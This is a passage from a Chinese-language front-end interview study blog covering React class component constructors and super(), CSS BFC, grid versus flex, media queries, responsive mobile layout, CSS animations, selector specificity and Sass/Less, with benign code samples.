<p>需要注意的是，尽管类组件具有这些优势，但React社区正在积极推动函数式组件和React Hooks的使用。函数式组件在代码的可读性和可维护性方面通常更好，因此在新项目中或在不需要类组件特定功能的情况下，函数式组件更受欢迎。此外，React团队还在不断改进和优化函数式组件的性能。</p>
<p>在选择类组件或函数式组件时，最重要的是根据项目的需求和团队的偏好来做出决策。你可以根据具体情况选择最适合你的组件类型。</p>
<h5 id="类组件的super"><a href="#类组件的super" class="headerlink" title="类组件的super"></a>类组件的super</h5><p>在React类组件中，<code>super()</code> 是用于调用父类构造函数的关键字。具体来说，它在子类的构造函数中用于调用父类的构造函数，以确保子类在初始化时继承了父类的属性和方法。</p>
<p>当你创建一个自定义的React类组件时，通常会继承<code>React.Component</code>或<code>React.PureComponent</code>，这是React提供的基类。为了确保子类正确地继承父类的功能，你需要在子类的构造函数中调用<code>super(props)</code>，将<code>props</code>参数传递给父类的构造函数。</p>
<p>以下是一个示例，演示了如何在React类组件中使用<code>super()</code>：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; <span class="hljs-title class_">Component</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props); <span class="hljs-comment">// 调用父类构造函数并传递props参数</span><br>    <span class="hljs-comment">// 在这里可以初始化组件的状态</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<br>      <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,<br>    &#125;;<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Count: &#123;this.state.count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.increment&#125;</span>&gt;</span>Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    );<br>  &#125;<br><br>  increment = <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 在事件处理程序中更新状态</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">MyComponent</span>;<br></code></pre></td></tr></table></figure>

<p>在上面的示例中，<code>super(props)</code> 调用了<code>Component</code>的构造函数，确保了<code>MyComponent</code>继承了<code>Component</code>的所有功能。这样，你就可以在<code>MyComponent</code>中使用React的生命周期方法和其他功能。</p>
<p>需要注意的是，如果你在构造函数中使用<code>super()</code>，则必须在调用<code>super()</code>之后再访问<code>this</code>，因为<code>this</code>在<code>super()</code>之前是不可用的。这是因为在调用<code>super()</code>之前，父类的构造函数尚未执行完毕。</p>
<h2 id="css篇"><a href="#css篇" class="headerlink" title="css篇"></a>css篇</h2><h3 id="x3D-x3D-1、bfc-x3D-x3D"><a href="#x3D-x3D-1、bfc-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;1、bfc&#x3D;&#x3D;"></a>&#x3D;&#x3D;1、bfc&#x3D;&#x3D;</h3><p>BFC（Block Formatting Context）是CSS中的一个重要概念，它用于控制和管理块级元素在文档流中的排布和布局。BFC的主要作用是解决页面布局和元素浮动时可能出现的问题，以及控制块级元素的尺寸和位置。</p>
<p>以下是BFC的主要作用：</p>
<ol>
<li><p><strong>清除浮动（Clearing Floats）</strong>：一个元素如果形成BFC，它的边框将会包围住浮动元素，从而防止浮动元素覆盖在它上面。这通常用于清除浮动元素的影响，以确保父元素能够正确包含浮动子元素。</p>
</li>
<li><p><strong>阻止外边距合并（Preventing Margin Collapsing）</strong>：在普通文档流中，相邻的垂直外边距有时会发生外边距合并（margin collapsing），导致外边距的合并值不如预期。在BFC中，外边距不会发生合并，从而确保了元素间的间隔。</p>
</li>
<li><p><strong>控制元素尺寸（Controlling Element Dimensions）</strong>：BFC可以包含块级格式化上下文中的子元素，从而影响这些子元素的尺寸和位置。这使得元素在布局时更容易控制。</p>
</li>
<li><p><strong>防止元素被浮动元素覆盖（Preventing Overlap with Floats）</strong>：在BFC中，元素的边框将会包围住浮动元素，防止浮动元素覆盖在它上面。</p>
</li>
<li><p><strong>在多列布局中的应用（Used in Multi-Column Layouts）</strong>：BFC在多列布局中也有应用，可以用于控制列的布局和边距。</p>
</li>
</ol>
<p>要创建一个BFC，可以使用以下方法之一：</p>
<ul>
<li>设置元素的 <code>overflow</code> 属性值为非 <code>visible</code>（例如，<code>overflow: auto</code> 或 <code>overflow: hidden</code>）。</li>
<li>设置元素的 <code>display</code> 属性值为 <code>table-cell</code>、<code>table-caption</code>、<code>table-row</code>、<code>flex</code>、<code>inline-block</code> 等值。</li>
<li>创建一个新的块级格式化上下文，可以通过在父元素上应用 <code>display: flow-root</code> 或 <code>contain: layout</code> 来实现。</li>
</ul>
<p>总的来说，BFC是CSS中一个重要的概念，用于解决布局和浮动相关的问题，以及控制块级元素的排布和尺寸。理解BFC对于实现复杂的页面布局和避免布局问题非常重要。</p>
<p><strong>BFC的应用场景：</strong></p>
<ol>
<li><strong>清除浮动：</strong> 使用BFC可以轻松地清除浮动，防止浮动元素影响到布局。</li>
</ol>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.clearfix</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: auto; <span class="hljs-comment">/* 或者 overflow: hidden; */</span><br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="2">
<li><strong>防止边距合并：</strong> 如果你不希望相邻元素的边距合并，可以将它们放置在不同的BFC中。</li>
</ol>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: hidden;<br>&#125;<br><br><span class="hljs-comment">/* 或者使用display: flow-root; */</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flow-root;<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="3">
<li><strong>包含浮动：</strong> 如果一个容器中包含浮动元素，可以使用BFC来使容器正确包裹浮动元素，以防止父元素高度塌陷。</li>
</ol>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: hidden;<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="4">
<li><strong>实现两栏布局：</strong> 使用BFC可以轻松实现两栏布局，其中一个栏固定宽度，另一个栏自适应剩余宽度。</li>
</ol>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#left</span> &#123;<br>  <span class="hljs-attribute">float</span>: left;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>&#125;<br><br><span class="hljs-selector-id">#right</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: hidden; <span class="hljs-comment">/* 创建BFC */</span><br>&#125;<br></code></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902181520963-20230902%2018:15:21.png" srcset="/blog/img/loading.gif" lazyload alt="image-20230902181520963" style="zoom:50%;" />

<p>总之，BFC是Web页面布局中一个非常有用的概念，它解决了一些常见的布局问题，如浮动清除、边距合并和包含浮动元素。了解BFC的特性和应用场景可以帮助你更好地控制和优化页面布局。</p>
<h3 id="2、grid布局和flex布局区别"><a href="#2、grid布局和flex布局区别" class="headerlink" title="2、grid布局和flex布局区别"></a>2、grid布局和flex布局区别</h3><p>Grid 布局（CSS Grid Layout）和 Flex 布局（CSS Flexible Box Layout）是两种不同的CSS布局模型，用于在网页中管理和定位元素。它们有一些重要的区别，适用于不同的布局需求和场景：</p>
<ol>
<li><p><strong>布局方向：</strong></p>
<ul>
<li><strong>Grid 布局：</strong> Grid 布局是一个二维布局模型，可以同时控制行和列，允许您创建复杂的网格结构，适用于需要在两个方向上对齐和分布元素的情况。</li>
<li><strong>Flex 布局：</strong> Flex 布局是一个一维布局模型，主要用于沿一个主轴（通常是水平或垂直）对齐和分布元素。它适用于构建灵活的单行或单列布局。</li>
</ul>
</li>
<li><p><strong>适用场景：</strong></p>
<ul>
<li><strong>Grid 布局：</strong> 适用于复杂的网格结构，例如网格布局、平铺布局、定位元素等，特别适用于构建多列和多行的布局。</li>
<li><strong>Flex 布局：</strong> 适用于单行或单列的布局，例如导航菜单、工具栏、垂直居中等。</li>
</ul>
</li>
<li><p><strong>元素排序：</strong></p>
<ul>
<li><strong>Grid 布局：</strong> Grid 布局使得元素的位置相对于网格单元格而言更为自由，元素可以跨越多个行和列，因此可以实现复杂的布局。</li>
<li><strong>Flex 布局：</strong> Flex 布局通常按照它们在主轴上的顺序排列，元素的顺序在主轴上具有重要意义，可以轻松重新排列元素的顺序。</li>
</ul>
</li>
<li><p><strong>对齐方式：</strong></p>
<ul>
<li><strong>Grid 布局：</strong> Grid 布局提供了多种对齐方式，可以在水平和垂直方向上分别控制元素的对齐方式。</li>
<li><strong>Flex 布局：</strong> Flex 布局主要关注主轴上的对齐，可以控制元素在主轴上的对齐方式，但在交叉轴上的对齐相对较少。</li>
</ul>
</li>
<li><p><strong>嵌套布局：</strong></p>
<ul>
<li><strong>Grid 布局：</strong> Grid 布局可以嵌套，您可以在一个网格容器内再创建一个子网格，以实现更复杂的布局。</li>
<li><strong>Flex 布局：</strong> Flex 布局也可以嵌套，但子 Flex 容器的布局相对独立，不会直接影响父 Flex 容器的布局。</li>
</ul>
</li>
</ol>
<p>综上所述，Grid 布局和 Flex 布局都是有用的CSS布局工具，根据具体的布局需求和设计要求来选择使用哪种布局模型。通常情况下，Grid 布局更适合用于创建复杂的网格结构，而 Flex 布局更适合用于简单的一维排列和对齐。在实际开发中，它们也可以结合使用，根据需要选择不同的布局模型。</p>
<h3 id="3、媒体查询原理"><a href="#3、媒体查询原理" class="headerlink" title="3、媒体查询原理"></a>3、媒体查询原理</h3><p>媒体查询（Media Queries）是CSS3中的一个重要特性，它允许您根据设备的特征和属性（如屏幕宽度、屏幕高度、设备方向、分辨率等）来应用不同的CSS样式。媒体查询的原理基于以下几个关键概念：</p>
<ol>
<li><p><strong>媒体查询语法：</strong> 媒体查询通过使用 <code>@media</code> 块来定义，其语法如下：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> media-type <span class="hljs-keyword">and</span> (media-features) &#123;<br>  <span class="hljs-comment">/* 在此定义样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>media-type</code> 表示要应用媒体查询的设备类型，如 <code>screen</code>（屏幕）、<code>print</code>（打印机）等。</li>
<li><code>media-features</code> 表示要匹配的媒体特性和条件，如 <code>max-width</code>（最大宽度）、<code>min-width</code>（最小宽度）、<code>orientation</code>（方向）等。</li>
</ul>
</li>
<li><p><strong>媒体查询条件：</strong> 在媒体查询中，您可以使用各种媒体特性来定义条件，以决定是否应用其中的样式规则。一些常见的媒体特性包括：</p>
<ul>
<li><code>width</code>：屏幕或视口的宽度。</li>
<li><code>height</code>：屏幕或视口的高度。</li>
<li><code>orientation</code>：设备的方向，可以是 <code>portrait</code>（纵向）或 <code>landscape</code>（横向）。</li>
<li><code>resolution</code>：设备的分辨率。</li>
<li><code>aspect-ratio</code>：屏幕或视口的宽高比。</li>
<li><code>color</code>：设备的色彩位深。</li>
<li><code>grid</code>：检测设备是否支持网格布局。</li>
</ul>
</li>
<li><p><strong>条件匹配：</strong> 媒体查询中的条件会与用户设备的实际属性进行比较，如果条件满足，媒体查询块内的样式规则将被应用。如果条件不满足，媒体查询块内的样式规则将被忽略。</p>
</li>
<li><p><strong>级联规则：</strong> 媒体查询可以进行级联，多个媒体查询条件可以一起使用，以便更精确地匹配各种设备和情况。多个条件之间可以使用 <code>and</code>、<code>not</code> 和 <code>only</code> 连接起来。</p>
</li>
</ol>
<p>下面是一个示例，演示了如何使用媒体查询来根据屏幕宽度应用不同的CSS样式：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 如果屏幕宽度小于等于600像素，则应用以下样式 */</span><br><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">600px</span>) &#123;<br>  <span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: lightblue;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/* 如果屏幕宽度大于600像素，则应用以下样式 */</span><br><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">601px</span>) &#123;<br>  <span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: lightgreen;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>上述代码中，两个媒体查询块分别根据屏幕宽度的条件应用不同的背景颜色样式。</p>
<p>媒体查询使得响应式设计变得更加容易，您可以根据不同设备和屏幕属性来调整页面的外观和布局，以提供更好的用户体验。媒体查询是现代Web设计的重要工具，有助于创建适应各种设备和屏幕尺寸的网页。</p>
<h3 id="4、移动端如何实现自适应"><a href="#4、移动端如何实现自适应" class="headerlink" title="4、移动端如何实现自适应"></a>4、移动端如何实现自适应</h3><p>在移动端实现自适应布局是确保网页在不同移动设备上能够以最佳方式呈现的重要步骤。以下是一些常见的方法来实现移动端自适应布局：</p>
<ol>
<li><p><strong>使用Viewport设置：</strong> 使用Viewport（视口）设置是移动端自适应布局的基础。Viewport是一个虚拟的浏览器窗口，它决定了网页在移动设备上的可见区域大小。通过以下的HTML标签，可以设置Viewport：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>width=device-width</code>：使Viewport的宽度等于设备屏幕的宽度。</li>
<li><code>initial-scale=1.0</code>：设置初始缩放比例为1，确保网页以设备的实际分辨率呈现。</li>
</ul>
</li>
<li><p><strong>使用百分比布局：</strong> 使用百分比布局是一种简单的方法，可以使元素的宽度和高度相对于其容器的百分比。这样，元素会根据容器的大小进行自适应调整。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;<br>&#125;<br><br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">float</span>: left;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>弹性布局（Flexbox）：</strong> CSS的Flexbox布局是一种强大的布局模型，适用于移动端自适应布局。它可以轻松地实现灵活的、响应式的布局。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-wrap</span>: wrap;<br>&#125;<br><br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">100px</span>; <span class="hljs-comment">/* 控制最小宽度 */</span><br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>媒体查询（Media Queries）：</strong> 媒体查询允许你根据屏幕尺寸、分辨率或设备特性来应用不同的CSS样式。这允许你为不同的设备或屏幕大小定制样式。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) &#123;<br>  <span class="hljs-comment">/* 在小屏幕上应用的样式 */</span><br>&#125;<br><br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">769px</span>) &#123;<br>  <span class="hljs-comment">/* 在大屏幕上应用的样式 */</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>CSS Grid布局：</strong> CSS Grid布局是一种强大的二维布局系统，它可以用于创建复杂的自适应布局，适用于各种屏幕尺寸。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">200px</span>, <span class="hljs-number">1</span>fr));<br>  <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>使用rem单位：</strong> 前面提到过，使用rem单位可以根据根元素的字体大小来设置元素的尺寸，实现相对于根元素的自适应布局。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">html</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>; <span class="hljs-comment">/* 设置根元素字体大小 */</span><br>&#125;<br><br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">2rem</span>; <span class="hljs-comment">/* 相对于根元素的字体大小，即32px */</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>CSS预处理器：</strong> 如果你使用CSS预处理器（如Sass或Less），它们通常提供了更灵活的布局工具，可以更轻松地实现自适应布局。</p>
</li>
</ol>
<p>总之，移动端自适应布局涉及多个因素，包括Viewport设置、CSS布局模型、媒体查询和单位选择。根据你的项目需求，可以选择合适的方法或组合多种方法来实现自适应布局，以确保你的网页在不同移动设备上具有良好的用户体验。</p>
<h3 id="5、css有哪些动画实现方式"><a href="#5、css有哪些动画实现方式" class="headerlink" title="5、css有哪些动画实现方式"></a>5、css有哪些动画实现方式</h3><p>在 CSS 中，有多种方式可以实现动画效果，这些方式可以用来创建各种交互性和视觉上的动画效果。以下是常见的 CSS 动画实现方式：</p>
<ol>
<li><p><strong>CSS Transitions（过渡动画）：</strong> 过渡动画通过指定属性的起始值和结束值来实现动画效果。它们通常用于在状态变化时添加平滑的过渡效果。使用 <code>transition</code> 属性来定义过渡属性、持续时间和时间函数。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 示例：在:hover状态下，改变背景颜色 */</span><br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ff0000</span>;<br>  <span class="hljs-attribute">transition</span>: background-color <span class="hljs-number">0.3s</span> ease;<br>&#125;<br><span class="hljs-selector-class">.box</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#00ff00</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>CSS Animations（关键帧动画）：</strong> 关键帧动画允许你创建更复杂的动画，通过定义关键帧（动画序列中的特定时间点）来控制属性的变化。使用 <code>@keyframes</code> 规则定义关键帧动画。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 示例：使用关键帧动画旋转元素 */</span><br><span class="hljs-keyword">@keyframes</span> rotate &#123;<br>  <span class="hljs-selector-tag">from</span> &#123;<br>    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">0deg</span>);<br>  &#125;<br>  <span class="hljs-selector-tag">to</span> &#123;<br>    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">360deg</span>);<br>  &#125;<br>&#125;<br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">animation</span>: rotate <span class="hljs-number">2s</span> linear infinite;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>CSS Transforms（变换动画）：</strong> 变换动画允许元素在平面内或3D空间内进行平移、旋转、缩放和倾斜。这些变换可以用来创建复杂的动画效果。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 示例：使用变换动画平移元素 */</span><br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">100px</span>);<br>  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span> ease;<br>&#125;<br><span class="hljs-selector-class">.box</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">200px</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>CSS Transitions 和 JavaScript 结合使用：</strong> 可以使用 JavaScript 来触发 CSS 过渡或动画的开始，例如，通过添加或删除 CSS 类来控制动画的触发。</p>
</li>
<li><p><strong>SVG 动画：</strong> 如果你正在处理可伸缩矢量图形 (SVG)，那么你可以使用 SVG 属性和元素来创建各种动画效果，如 <code>animate</code> 和 <code>animateTransform</code> 元素。</p>
</li>
<li><p><strong>CSS Grid 和 Flexbox 布局动画：</strong> 使用 CSS Grid 和 Flexbox 布局可以实现元素在布局中的动态调整，从而创建动画效果。</p>
</li>
<li><p><strong>CSS 绘制动画：</strong> 通过使用 CSS <code>clip-path</code> 属性、<code>mask</code> 属性、CSS Shapes 等技术，可以创建一些非常有趣的绘制动画。</p>
</li>
<li><p><strong>第三方 CSS 动画库：</strong> 除了原生 CSS 动画，还有许多第三方 CSS 动画库，如 Animate.css、GSAP（GreenSock Animation Platform）等，它们提供了丰富的预定义动画效果和更高级的控制选项。</p>
</li>
</ol>
<p>选择合适的动画实现方式取决于你的具体需求和所要实现的效果。对于简单的过渡效果，使用 CSS 过渡可能足够；对于更复杂的动画，可能需要使用关键帧动画或第三方动画库。在动画设计中，也要考虑性能和可访问性方面的问题。</p>
<h3 id="6、css选择器及优先级"><a href="#6、css选择器及优先级" class="headerlink" title="6、css选择器及优先级"></a>6、css选择器及优先级</h3><p>CSS（层叠样式表）选择器用于选择 HTML 元素并为其应用样式。选择器的优先级决定了当多个选择器同时匹配同一元素时，哪个样式规则将应用于元素。CSS 选择器的优先级是基于选择器的特定性（specificity）和重要性（!important）来计算的。</p>
<p>以下是一些常见的 CSS 选择器以及它们的优先级（从高到低）：</p>
<ol>
<li><p><strong>ID 选择器（#id）：</strong> ID 选择器具有最高的特定性，因此优先级最高。例如：<code>#myElement &#123; color: red; &#125;</code></p>
</li>
<li><p><strong>类选择器（.class）：</strong> 类选择器在特定性上低于 ID 选择器，但高于标签选择器。例如：<code>.button &#123; background-color: blue; &#125;</code></p>
</li>
<li><p><strong>标签选择器（element）：</strong> 标签选择器是根据 HTML 元素的标签名称来选择元素的。例如：<code>p &#123; font-size: 16px; &#125;</code></p>
</li>
<li><p><strong>伪类选择器（:pseudo-class）：</strong> 伪类选择器用于选择元素的特殊状态或位置，如 <code>:hover</code>、<code>:first-child</code> 等。它们的特定性较低。例如：<code>a:hover &#123; text-decoration: underline; &#125;</code></p>
</li>
<li><p><strong>属性选择器（[attribute]）：</strong> 属性选择器根据元素的属性来选择元素，如 <code>[data-toggle=&quot;modal&quot;]</code>。它们的特定性较低。</p>
</li>
<li><p><strong>通配选择器（*）：</strong> 通配选择器具有最低的特定性，会匹配所有元素。例如：<code>* &#123; margin: 0; &#125;</code></p>
</li>
<li><p><strong>重要性（!important）：</strong> 使用 <code>!important</code> 标志的样式规则具有最高的优先级，无论特定性如何。例如：<code>color: red !important;</code></p>
</li>
</ol>
<p>CSS 选择器的特定性是根据选择器中包含的 ID、类、标签和伪类的数量和顺序来计算的。通常，特定性是一个三位数，依次表示 ID 数量、类&#x2F;属性&#x2F;伪类数量和标签数量。例如，选择器 <code>#header .title</code> 的特定性是 <code>0, 1, 1</code>，因为它包含一个类选择器和一个标签选择器。</p>
<p>如果两个样式规则具有相同的特定性，那么后面定义的规则将覆盖先前的规则。如果两个规则都使用了 <code>!important</code>，则 <code>!important</code> 规则将具有更高的优先级。</p>
<p>在实际开发中，了解选择器的优先级可以帮助你更好地控制样式的应用和覆盖，但应该尽量避免过度使用 <code>!important</code>，以保持样式表的可维护性。</p>
<h3 id="7、scss-less-优势"><a href="#7、scss-less-优势" class="headerlink" title="7、scss less 优势"></a>7、scss less 优势</h3><p>SCSS 和 Less 都是预处理器（CSS预处理语言），它们在原生CSS的基础上提供了一些便捷的功能和语法，使得样式的编写和维护更加容易。下面是它们的一些优势：</p>
<h5 id="SCSS（Sass）"><a href="#SCSS（Sass）" class="headerlink" title="SCSS（Sass）"></a>SCSS（Sass）</h5><ol>
<li><p><strong>丰富的特性：</strong> SCSS 提供了丰富的特性，如变量、嵌套、混合（Mixins）、继承、条件语句等，这些功能可以提高代码的可维护性和可读性。</p>
</li>
<li><p><strong>成熟的生态系统：</strong> Sass（SCSS的前身）已经存在了很长时间，有一个成熟的生态系统，包括大量的第三方库和工具，以及社区支持。</p>
</li>
<li><p><strong>变量和嵌套：</strong> SCSS 允许使用变量来保存颜色、字体大小等属性值，同时支持嵌套规则，可以更清晰地组织样式。</p>
</li>
